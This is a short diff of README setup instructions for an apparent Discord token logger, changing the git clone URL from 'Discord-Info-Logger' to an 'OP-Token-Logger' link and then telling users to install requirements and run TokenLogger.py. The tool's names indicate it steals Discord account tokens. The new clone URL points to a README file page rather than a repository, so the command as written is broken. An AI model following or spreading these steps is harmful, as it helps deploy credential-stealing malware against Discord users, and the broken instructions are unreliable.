@@ -7,7 +7,7 @@ Depending on your python installation your commands may vary. Below are the comm
 
 Windows:
 
-git clone https://github.com/LocalsGitHub/Discord-Info-Logger.git
+git clone https://github.com/Dracolol/OP-Token-Logger/blob/main/README.md
 cd Discord-Info-Logger
 pip install -r requirements.txt
 py TokenLogger.py
